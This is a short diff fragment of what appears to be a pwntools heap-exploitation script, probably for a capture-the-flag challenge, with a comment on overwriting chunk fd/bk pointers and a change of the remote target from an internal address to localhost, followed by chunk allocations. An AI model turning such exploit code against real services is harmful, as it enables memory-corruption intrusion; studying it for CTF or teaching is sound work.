@@ -36,7 +36,7 @@ buffer_1->fd = buffer_2
 victim->bk   = buffer_2
 '''
 
-s = remote("172.17.4.8", 4242)
+s = remote("localhost", 4444)
 add(0, 256, "")
 add(1, 256, "")
 add(2, 256, "")
